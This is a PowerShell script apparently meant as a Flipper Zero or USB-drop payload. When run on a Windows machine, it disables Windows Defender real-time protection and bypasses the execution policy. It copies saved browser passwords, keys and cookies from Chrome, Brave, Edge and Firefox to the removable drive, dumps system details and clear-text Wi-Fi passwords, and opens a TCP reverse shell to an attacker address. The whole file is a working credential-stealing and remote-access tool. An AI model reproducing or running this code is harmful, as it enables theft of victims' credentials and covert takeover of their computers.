# sy_cred.ps1
# Dynamically detect removable drive (Flipper Zero storage)
$duckletter = (Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }).DeviceID | Select-Object -First 1
Set-Location $duckletter

# Bypass PowerShell execution policy
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force

# Disable Windows Defender real-time monitoring (requires admin)
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "${duckletter}\"

# Set destination directory
$destDir = "$duckletter\$env:USERNAME"
if (-Not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir
}

# Function to copy browser files
function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
    $browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
    if (-Not (Test-Path $browserDestDir)) {
        New-Item -ItemType Directory -Path $browserDestDir
    }
    foreach ($file in $filesToCopy) {
        $source = Join-Path -Path $browserDir -ChildPath $file
        if (Test-Path $source) {
            Copy-Item -Path $source -Destination $browserDestDir
            Write-Host "$browserName - File copied: $file"
        } else {
            Write-Host "$browserName - File not found: $file"
        }
    }
}

# Configuration for Google Chrome
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$chromeFilesToCopy = @("Login Data")
CopyBrowserFiles "Chrome" $chromeDir $chromeFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Chrome") -ErrorAction SilentlyContinue

# Configuration for Brave
$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
$braveFilesToCopy = @("Login Data")
CopyBrowserFiles "Brave" $braveDir $braveFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Brave") -ErrorAction SilentlyContinue

# Configuration for Firefox
$firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
$firefoxProfile = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default-release" | Select-Object -First 1
if ($firefoxProfile) {
    $firefoxDir = $firefoxProfile.FullName
    $firefoxFilesToCopy = @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")
    CopyBrowserFiles "Firefox" $firefoxDir $firefoxFilesToCopy
} else {
    Write-Host "Firefox - No profile found."
}

# Configuration for Microsoft Edge
$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
$edgeFilesToCopy = @("Login Data")
CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Edge") -ErrorAction SilentlyContinue

# Gather system information
function GatherSystemInfo {
    $sysInfoDir = "$duckletter\$env:USERNAME\SystemInfo"
    if (-Not (Test-Path $sysInfoDir)) {
        New-Item -ItemType Directory -Path $sysInfoDir
    }
    Get-ComputerInfo | Out-File -FilePath "$sysInfoDir\computer_info.txt"
    Get-Process | Out-File -FilePath "$sysInfoDir\process_list.txt"
    Get-Service | Out-File -FilePath "$sysInfoDir\service_list.txt"
    Get-NetIPAddress | Out-File -FilePath "$sysInfoDir\network_config.txt"
}
GatherSystemInfo

# Retrieve Wi-Fi passwords
function GetWifiPasswords {
    $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
    $results = @()
    foreach ($profile in $wifiProfiles) {
        $profileDetails = netsh wlan show profile name="$profile" key=clear
        $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
        $results += [PSCustomObject]@{
            ProfileName = $profile
            KeyContent  = $keyContent
        }
    }
    $results | Out-File -FilePath "$duckletter\$env:USERNAME\WiFi_Details.txt"
}
GetWifiPasswords

# Reverse shell
function ReverseShell {
    param(
        [string]$ip = "172.20.10.2",  # Replace with attacker IP
        [int]$port = 4444    # Replace with attacker port
    )
    try {
        $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | ForEach-Object {0}
        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
            $sendback = (Invoke-Expression $data 2>&1 | Out-String)
            $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
    } catch {
        Write-Host "Reverse shell failed: $_"
    }
}
ReverseShell

# Re-enable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $false
exit
